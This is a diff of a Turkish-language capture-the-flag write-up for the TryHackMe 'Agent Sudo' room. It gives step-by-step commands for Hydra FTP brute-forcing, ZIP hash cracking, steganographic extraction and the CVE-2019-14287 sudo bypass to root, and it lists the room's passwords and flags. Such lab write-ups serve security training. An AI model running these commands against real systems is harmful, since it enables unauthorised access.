@@ -3,772 +3,304 @@
 ## Room Information
 
 | Difficulty | Category |
-|------------|----------|
+| :--- | :--- |
 | Easy | Linux, Web, Steganography, Privilege Escalation |
 
 Bu write-up'ta TryHackMe platformunda bulunan **Agent Sudo** odasının çözüm sürecini adım adım inceleyeceğiz. Oda; web enumeration, User-Agent manipülasyonu, brute-force saldırıları, FTP erişimi, steganografi ve Linux privilege escalation gibi birçok temel pentest konusunu içerisinde barındırmaktadır.
 
 ---
 
-# Enumeration
+## 1. Enumeration
 
-Her pentest sürecinde olduğu gibi ilk iş hedef sistemi enumerate etmektir.
-
-Bunun için Nmap kullanıyoruz.
+Her pentest sürecinde olduğu gibi ilk iş hedef sistemi enumerate etmektir. Bunun için Nmap kullanıyoruz.
 
 ```bash
 nmap -sC -sV -T5 10.112.156.127
-```
-
 Parametreler:
 
-- **-sC** → Varsayılan NSE scriptlerini çalıştırır.
-- **-sV** → Servis versiyonlarını tespit eder.
-- **-T5** → Daha agresif tarama gerçekleştirir.
+-sC → Varsayılan NSE scriptlerini çalıştırır.
+
+-sV → Servis versiyonlarını tespit eder.
+
+-T5 → Daha agresif tarama gerçekleştirir.
 
 Sonuç:
 
-```
+Plaintext
 PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1
+80/tcp open  http    Apache 2.4.29
+Makinede toplam 3 adet açık port bulunmaktadır:
 
-21/tcp open ftp vsftpd 3.0.3
+FTP (21)
 
-22/tcp open ssh OpenSSH 7.6p1
+SSH (22)
 
-80/tcp open http Apache 2.4.29
-```
-
-Makinede toplam **3 adet açık port** bulunmaktadır.
-
-- FTP (21)
-- SSH (22)
-- HTTP (80)
+HTTP (80)
 
 İlk sorunun cevabı da buradan elde edilmektedir.
 
----
+2. Web Enumeration
+HTTP servisini (Port 80) ziyaret ettiğimizde aşağıdaki sayfa bizi karşılıyor:
 
-# Web Enumeration
-
-HTTP servisini ziyaret ettiğimizde aşağıdaki sayfa bizi karşılıyor.
-
-```
+Plaintext
 Dear agents,
-
 Use your own codename as user-agent to access the site.
-
 From,
-
 Agent R
-```
+Sayfa bize doğrudan bir ipucu vermektedir: "Use your own codename as user-agent". Yani standart HTTP isteği yeterli değildir. Sunucu, gelen User-Agent başlığına göre farklı cevaplar üretmektedir.
 
-Sayfa bize doğrudan bir ipucu vermektedir.
+3. User-Agent Manipulation
+Bu aşamada Burp Suite kullanılmaktadır. İlk olarak hedefi yalnızca bu makine ile sınırlandırmak için Scope içerisine ekledim. Ardından isteği Repeater sekmesine gönderdim.
 
-> "Use your own codename as user-agent"
-
-Yani standart HTTP isteği yeterli değildir.
-
-Sunucu, gelen **User-Agent** başlığına göre farklı cevaplar üretmektedir.
-
----
-
-# User-Agent Manipulation
-
-Bu aşamada Burp Suite kullanılmaktadır.
-
-İlk olarak hedefi yalnızca bu makine ile sınırlandırmak için Scope içerisine ekledim.
-
-Ardından isteği **Repeater** sekmesine gönderdim.
-
-İlk denemelerde farklı User-Agent değerleri kullandım.
-
-Örneğin;
-
-```
-User-Agent: AgentR
-```
-
-ve
-
-```
-User-Agent: R
-```
-
-gibi denemeler yaptım.
+İlk denemelerde farklı User-Agent değerleri kullandım (Örn: AgentR ve R).
 
 Gönderilen istek:
 
-```http
+HTTP
 GET / HTTP/1.1
 Host: 10.112.156.127
 User-Agent: R
-```
-
 Sunucunun cevabı:
 
-```
+Plaintext
 What are you doing!
-
 Are you one of the 25 employees?
-
 If not, I going to report this incident.
-```
+Bu cevap önemliydi çünkü artık gerçekten User-Agent değerinin kontrol edildiğini doğrulamış olduk.
 
-Bu cevap önemliydi.
+4. Intruder ile Brute Force
+Mesaj içerisinde "25 employees" ifadesi geçiyordu. Muhtemelen ajan isimleri tek harflerden (İngiliz alfabesindeki 26 harf, biri zaten dolu) oluşuyordu. Bu nedenle User-Agent alanını Intruder içerisine gönderdim ve payload olarak yalnızca alfabeyi kullandım (A'dan Z'ye).
 
-Çünkü artık gerçekten User-Agent değerinin kontrol edildiğini doğrulamış olduk.
+Bu teknik klasik anlamda parola brute-force'u olmasa da User-Agent header'ını enumerate etmek için oldukça işe yaradı. İsteklerden biri (C) diğerlerinden farklı cevap döndürdü:
 
----
-
-# Intruder ile Brute Force
-
-Buradan sonra aklıma oldukça basit bir fikir geldi.
-
-Mesaj içerisinde "25 employees" ifadesi geçiyordu.
-
-Muhtemelen ajan isimleri tek harflerden oluşuyordu.
-
-Bu nedenle User-Agent alanını Intruder içerisine gönderdim.
-
-Payload olarak yalnızca alfabeyi kullandım.
-
-```
-A
-B
-C
-D
-E
-...
-Z
-```
-
-Bu teknik klasik anlamda parola brute-force'u olmasa da User-Agent header'ını enumerate etmek için oldukça işe yaradı.
-
-İsteklerden biri diğerlerinden farklı cevap döndürdü.
-
-```
+HTTP
 HTTP/1.1 302 Found
+Location: agent_C_attention.php
+Redirect'i takip ettikten sonra yeni sayfaya ulaştık:
 
-Location:
-agent_C_attention.php
-```
-
-Artık elimizde yeni bir endpoint vardı.
-
-Redirect'i takip ettikten sonra yeni sayfaya ulaştık.
-
-```
+Plaintext
 Attention chris,
-
 Do you still remember our deal?
-
 Please tell agent J about the stuff ASAP.
-
-Also,
-
-change your god damn password,
-
-is weak.
-
+Also, change your god damn password, is weak.
 From,
-
 Agent R
-```
+Bu sayfa bize iki önemli bilgi vermektedir:
 
-Bu sayfa bize iki önemli bilgi vermektedir.
+Chris isimli kullanıcı bulunmaktadır.
 
-- Chris isimli kullanıcı bulunmaktadır.
-- Şifresinin zayıf olduğu belirtilmektedir.
+Şifresinin zayıf olduğu belirtilmektedir.
 
 Bu nedenle sıradaki hedef FTP olacaktır.
 
----
+5. FTP Brute Force
+Makinede FTP servisi açıktı ve elimizde artık bir kullanıcı adı vardı. Hydra kullanarak parola saldırısı gerçekleştiriyorum:
 
-# FTP Brute Force
+Bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.112.156.127 -t 16 -V
+Kısa süre sonra parola bulundu:
 
-Makinede FTP servisi açıktı.
-
-Elimizde artık kullanıcı adı da vardı.
-
-Hydra kullanarak parola saldırısı gerçekleştiriyorum.
-
-```bash
-hydra -l chris \
--P /usr/share/wordlists/rockyou.txt \
-ftp://10.112.156.127 \
--t 16 -V
-```
-
-Kısa süre sonra parola bulundu.
-
-```
+Plaintext
 login: chris
-
 password: crystal
-```
-
 Böylece FTP erişimini elde etmiş olduk.
 
----
+6. FTP Enumeration
+FTP bağlantısı kuruluyor:
 
-# FTP Enumeration
-
-FTP bağlantısı kuruluyor.
-
-```bash
+Bash
 ftp 10.112.156.127
-```
+Dosyaları listeliyoruz (ls -la):
 
-Giriş:
-
-```
-Username:
-
-chris
-
-Password:
-
-crystal
-```
-
-Dosyaları listeliyoruz.
-
-```bash
-ls -la
-```
-
-Sonuç:
-
-```
+Plaintext
 To_agentJ.txt
-
 cute-alien.jpg
-
 cutie.png
-```
-
-İlk olarak metin dosyası indiriliyor.
-
-```bash
-get To_agentJ.txt
-```
+İlk olarak metin dosyası indiriliyor (get To_agentJ.txt).
 
 İçeriği:
 
-```text
+Plaintext
 Dear agent J,
-
 All these alien like photos are fake!
-
 Agent R stored the real picture inside your directory.
-
 Your login password is somehow stored in the fake picture.
-
 It shouldn't be a problem for you.
-
 From,
-
 Agent C
-```
+Mesaj oldukça önemliydi çünkü iki resim arasında bir ayrım yapıyordu:
 
-Mesaj oldukça önemliydi.
+cute-alien.jpg → Fake (Decoy - Parola içeriyor)
 
-Çünkü iki resim arasında bir ayrım yapıyordu.
+cutie.png → Bir sonraki ipucunu içeriyor.
 
-- cute-alien.jpg → Fake (Decoy)
-- cutie.png → Bir sonraki ipucunu içeriyor.
+Bu nedenle ilk inceleme cutie.png üzerinde gerçekleştirildi.
 
-Bu nedenle ilk inceleme **cutie.png** üzerinde gerçekleştirildi.
+7. cutie.png Analizi
+İlk olarak dosya tipi kontrol edildi (file cutie.png) ve metadata incelendi (exiftool cutie.png). Herhangi dikkat çekici bir bilgi bulunamadı. Gömülü veri olup olmadığını görmek amacıyla Binwalk kullanıldı:
 
----
-
-# cutie.png Analizi
-
-İlk olarak dosya tipi kontrol edildi.
-
-```bash
-file cutie.png
-```
-
-Ardından metadata incelendi.
-
-```bash
-exiftool cutie.png
-```
-
-Herhangi dikkat çekici bir bilgi bulunamadı.
-
-Bu nedenle gömülü veri olup olmadığını görmek amacıyla Binwalk kullanıldı.
-
-```bash
+Bash
 binwalk cutie.png
-```
-
 Sonuç:
 
-```
+Plaintext
 ZIP archive
-
 offset: 34562
-```
+PNG dosyasının sonuna gömülmüş bir ZIP arşivi bulundu. Dosya dışarı çıkarılıyor:
 
-PNG dosyasının sonuna gömülmüş bir ZIP arşivi bulundu.
-
-Dosya dışarı çıkarılıyor.
-
-```bash
+Bash
 binwalk -e --run-as=root cutie.png
-```
+Oluşan klasöre (_cutie.png.extracted) geçiyoruz. İçerisinde 8702.zip bulunmaktadır. Normal unzip aracı uyumsuzluk hatası verdiği için 7-Zip tercih edildi:
 
-Oluşan klasöre geçiyoruz.
-
-```
-_cutie.png.extracted
-```
-
-İçerisinde:
-
-```
-8702.zip
-```
-
-bulunmaktadır.
-
-Normal unzip aracı uyumsuzluk hatası verdiği için 7-Zip tercih edildi.
-
-```bash
+Bash
 7z x 8702.zip
-```
-
 Ancak ZIP dosyası parola korumalıydı.
 
-Bu nedenle parola kırılması gerekmektedir.
+8. ZIP Password Cracking
+Öncelikle hash oluşturuldu:
 
----
-
-# ZIP Password Cracking
-
-Öncelikle hash oluşturuldu.
-
-```bash
+Bash
 zip2john 8702.zip > zip_hash.txt
-```
+Ardından John The Ripper çalıştırıldı:
 
-Ardından John The Ripper çalıştırıldı.
+Bash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
+Sonuç: alien. Artık arşiv açılabilir.
 
-```bash
-john \
---wordlist=/usr/share/wordlists/rockyou.txt \
-zip_hash.txt
-```
-
-Sonuç:
-
-```
-alien
-```
-
-ZIP parolası başarıyla elde edildi.
-
-```
-alien
-```
-
-Artık arşiv açılabilir.
-
-```bash
+Bash
 7z x 8702.zip
-```
+Şifre olarak alien girildi ve içerisinden To_agentR.txt dosyası çıktı.
 
-Şifre olarak:
+9. To_agentR.txt Analizi
+Dosya okunduğunda aşağıdaki içerik ile karşılaşıldı:
 
-```
-alien
-```
-
-girildi.
-
-İçerisinden aşağıdaki dosya çıktı.
-
-```
-To_agentR.txt
-```
-
-# To_agentR.txt Analizi
-
-Arşiv başarıyla açıldıktan sonra içerisinden **To_agentR.txt** isimli dosya elde edildi.
-
-```bash
-cat To_agentR.txt
-```
-
-İçerik:
-
-```text
+Plaintext
 Agent C,
-
 We need to send the picture to 'QXJlYTUx' as soon as possible!
-
 By,
 Agent R
-```
+Mesaj içerisinde göze çarpan ilk ifade: QXJlYTUx. Bu karakter dizisi Base64 formatına benzemektedir. Decode işlemi gerçekleştirildi:
 
-Mesaj içerisinde göze çarpan ilk ifade:
-
-```
-QXJlYTUx
-```
-
-Bu karakter dizisi Base64 formatına benzemektedir.
-
-Decode işlemi gerçekleştirildi.
-
-```bash
+Bash
 echo "QXJlYTUx" | base64 -d
-```
-
-Sonuç:
-
-```
-Area51
-```
+Sonuç: Area51
 
 Artık elimizde yeni bir parola bulunmaktadır.
 
-Bu aşamada ilk akla gelen yöntem steghide ile görüntü dosyası içerisine gizlenmiş veriyi çıkarmaktır.
+10. Steganography
+To_agentJ.txt dosyasında daha önce belirtilen ipucuna tekrar baktığımızda; "All these alien like photos are fake." mesajında bahsedilen "fake picture" aslında cute-alien.jpg dosyasıydı.
 
----
+Steghide aracı ile gizlenmiş veriyi çıkarıyoruz:
 
-# Steganography
-
-Önce yanlış dosya üzerinde deneme yaptım.
-
-```bash
-steghide extract -sf cutie.png
-```
-
-Ancak steghide PNG formatını desteklemediği için herhangi bir veri çıkarılamadı.
-
-To_agentJ.txt dosyasında daha önce belirtilen ipucuna tekrar baktığımızda;
-
-> "All these alien like photos are fake."
-
-Mesajda bahsedilen "fake picture" aslında **cute-alien.jpg** dosyasıydı.
-
-Bu nedenle steghide bu kez JPEG dosyası üzerinde kullanıldı.
-
-İlk denemelerde parola parametresi ile çalıştırdığım komut başarısız oldu.
-
-```bash
-steghide extract -sf cute-alien.jpg -p area51
-```
-
-Daha sonra etkileşimli olarak çalıştırdığımda parola kabul edildi.
-
-```bash
+Bash
 steghide extract -sf cute-alien.jpg
-```
-
-Passphrase:
-
-```
-Area51
-```
-
-Çıktı:
-
-```
-wrote extracted data to "message.txt"
-```
-
-Yeni oluşan dosya okunuyor.
-
-```bash
-cat message.txt
-```
+Passphrase olarak Area51 girildi. Çıktı olarak message.txt elde edildi.
 
 İçeriği:
 
-```text
+Plaintext
 Hi james,
-
 Glad you find this message.
-
 Your login password is hackerrules!
-
 Don't ask me why the password look cheesy,
 ask agent R who set this password.
-
 Your buddy,
-
 chris
-```
+Artık SSH kullanıcı adı ve parolasını elde etmiş olduk:
 
-Artık SSH kullanıcı adı ve parolasını elde etmiş olduk.
+Username: james
 
-| Username | Password |
-|----------|----------|
-| james | hackerrules |
+Password: hackerrules
 
----
+11. SSH Access & Sudo Enumeration
+SSH bağlantısı gerçekleştiriliyor:
 
-# SSH Access
-
-SSH bağlantısı gerçekleştiriliyor.
-
-```bash
+Bash
 ssh james@10.112.156.127
-```
+Parola girilip bağlantı kurulduktan sonra kullanıcı dizini inceleniyor (ls).
 
-Parola:
+Sonuç: Alien_autospy.jpg ve user_flag.txt.
+User flag okunuyor: b03d975e8c92a7c04146cfa7a5a313c7
 
-```
-hackerrules
-```
+Her privilege escalation sürecinde olduğu gibi ilk yapılması gereken işlem sudo yetkilerini kontrol etmektir:
 
-Bağlantı kurulduktan sonra kullanıcı dizini inceleniyor.
-
-```bash
-ls
-```
-
-Sonuç:
-
-```
-Alien_autospy.jpg
-
-user_flag.txt
-```
-
-User flag okunuyor.
-
-```bash
-cat user_flag.txt
-```
-
-```
-b03d975e8c92a7c04146cfa7a5a313c7
-```
-
----
-
-# Sudo Enumeration
-
-Her privilege escalation sürecinde olduğu gibi ilk yapılması gereken işlem sudo yetkilerini kontrol etmektir.
-
-```bash
+Bash
 sudo -l
-```
-
 Sonuç:
 
-```text
+Plaintext
 User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+Kullanıcı root dışında herkes olarak /bin/bash çalıştırabiliyor gibi görünmektedir.
 
-(ALL, !root) /bin/bash
-```
+12. Privilege Escalation (CVE-2019-14287)
+Sistemde bulunan sudo sürümü CVE-2019-14287 zafiyetinden etkilenmektedir. Bu zafiyet sayesinde !root kısıtlaması, -u#-1 tekniği kullanılarak bypass edilebilmektedir.
 
-İlk bakışta kullanıcı root dışında herkes olarak `/bin/bash` çalıştırabiliyor gibi görünmektedir.
+Root shell elde etmek için aşağıdaki komut çalıştırıldı:
 
-Fakat bu yapılandırma geçmişte keşfedilmiş kritik bir sudo zafiyetinden etkilenmektedir.
-
----
-
-# Privilege Escalation
-
-Sistemde bulunan sudo sürümü **CVE-2019-14287** zafiyetinden etkilenmektedir.
-
-Bu zafiyet sayesinde;
-
-```
-!root
-```
-
-kısıtlaması
-
-```
--u#-1
-```
-
-tekniği kullanılarak bypass edilebilmektedir.
-
-Root shell elde etmek için aşağıdaki komut çalıştırıldı.
-
-```bash
+Bash
 sudo -u#-1 /bin/bash
-```
+Kontrol edildiğinde artık root yetkilerine sahibiz (whoami -> root).
 
-Kontrol edildiğinde artık root yetkilerine sahibiz.
+Root dizinine geçiyoruz (cd /root) ve flag'i okuyoruz:
 
-```bash
-whoami
-```
-
-```
-root
-```
-
-Böylece sistem üzerinde tam yetki elde edilmiş oldu.
-
----
-
-# Root Flag
-
-Root dizinine geçiyoruz.
-
-```bash
-cd /root
-```
-
-Dosyalar listeleniyor.
-
-```bash
-ls -la
-```
-
-Sonuç:
-
-```
-root.txt
-```
-
-Flag okunuyor.
-
-```bash
+Bash
 cat root.txt
-```
-
-```
+Plaintext
 To Mr.hacker,
-
 Congratulation on rooting this box.
-
 This box was designed for TryHackMe.
-
 Tips, always update your machine.
-
 Your flag is
-
 b53a02f55b57d4439e3341834d70c062
-
 By,
-
 DesKel a.k.a Agent R
-```
+Makine başarıyla rootlanmış oldu!
 
-Makine başarıyla rootlanmış oldu.
-
----
-
-# Questions & Answers
-
-## How many open ports?
-
-```
+Questions & Answers
+How many open ports?
 3
-```
 
----
-
-## How you redirect yourself to a secret page?
-
-```
+How you redirect yourself to a secret page?
 User-Agent Header
-```
 
----
-
-## What is the agent name?
-
-```
+What is the agent name?
 Chris
-```
 
----
-
-## FTP password
-
-```
+FTP password
 crystal
-```
 
----
-
-## Zip file password
-
-```
+Zip file password
 alien
-```
 
----
-
-## steg password
-
-```
+steg password
 Area51
-```
 
----
-
-## Who is the other agent (in full name)?
-
-```
+Who is the other agent (in full name)?
 James
-```
 
----
-
-## SSH password
-
-```
+SSH password
 hackerrules
-```
 
----
-
-## What is the user flag?
-
-```
+What is the user flag?
 b03d975e8c92a7c04146cfa7a5a313c7
-```
 
----
-
-## What is the incident of the photo called?
-
-```
+What is the incident of the photo called?
 Roswell Alien Autopsy
-```
 
----
-
-## CVE number for the escalation
-
-```
+CVE number for the escalation
 CVE-2019-14287
-```
 
----
-
-## What is the root flag?
-
-```
+What is the root flag?
 b53a02f55b57d4439e3341834d70c062
-```
 
----
-
-## Bonus - Who is Agent R?
-
-```
+Bonus - Who is Agent R?
 DesKel
-```
 
----
-
-# Attack Path
-
-```
+Attack Path
+Plaintext
 Nmap Enumeration
         │
         ▼
@@ -778,31 +310,19 @@ Web Enumeration
 User-Agent Manipulation
         │
         ▼
-Burp Repeater
+Burp Repeater & Intruder (Alphabet Enumeration)
         │
         ▼
-Burp Intruder (Alphabet Enumeration)
-        │
-        ▼
-Agent C Endpoint
-        │
-        ▼
-Username Discovery (Chris)
+Agent C Endpoint & Username Discovery (Chris)
         │
         ▼
 Hydra FTP Brute Force
         │
         ▼
-FTP Login
+FTP Login & Download Files
         │
         ▼
-Download Files
-        │
-        ▼
-Binwalk
-        │
-        ▼
-ZIP Extraction
+Binwalk & ZIP Extraction
         │
         ▼
 John The Ripper
@@ -817,60 +337,68 @@ Steghide
 SSH Access (James)
         │
         ▼
-sudo -l
-        │
-        ▼
-CVE-2019-14287
+sudo -l (CVE-2019-14287)
         │
         ▼
 ROOT
-```
+Tools Used
+Nmap
 
----
+Burp Suite (Repeater, Intruder)
 
-# Tools Used
+Hydra
 
-- Nmap
-- Burp Suite
-  - Repeater
-  - Intruder
-- Hydra
-- FTP
-- file
-- exiftool
-- binwalk
-- zip2john
-- John the Ripper
-- 7-Zip
-- base64
-- steghide
-- SSH
-- sudo
+FTP
 
----
+file
 
-# Lessons Learned
+exiftool
 
-Bu oda sayesinde aşağıdaki konular üzerinde pratik yapılmıştır.
+binwalk
 
-- Servis Enumeration
-- HTTP Header Manipulation
-- User-Agent tabanlı erişim kontrolleri
-- Burp Suite Repeater kullanımı
-- Burp Suite Intruder ile header enumeration
-- Hydra ile FTP brute force
-- FTP Enumeration
-- Steganography
-- Binwalk kullanımı
-- John The Ripper ile ZIP parola kırma
-- Base64 analizi
-- Steghide ile gizli veri çıkarma
-- SSH erişimi
-- Linux Privilege Escalation
-- Sudo misconfiguration analizi
-- CVE-2019-14287 istismarı
+zip2john & John the Ripper
 
----
+7-Zip
 
-# Conclusion
+base64
 
+steghide
+
+SSH
+
+sudo
+
+Lessons Learned
+Bu oda sayesinde aşağıdaki konular üzerinde pratik yapılmıştır:
+
+Servis Enumeration
+
+HTTP Header Manipulation
+
+User-Agent tabanlı erişim kontrolleri
+
+Burp Suite Repeater kullanımı
+
+Burp Suite Intruder ile header enumeration
+
+Hydra ile FTP brute force
+
+FTP Enumeration
+
+Steganography
+
+Binwalk kullanımı
+
+John The Ripper ile ZIP parola kırma
+
+Base64 analizi
+
+Steghide ile gizli veri çıkarma
+
+SSH erişimi
+
+Linux Privilege Escalation
+
+Sudo misconfiguration analizi
+
+CVE-2019-14287 istismarı
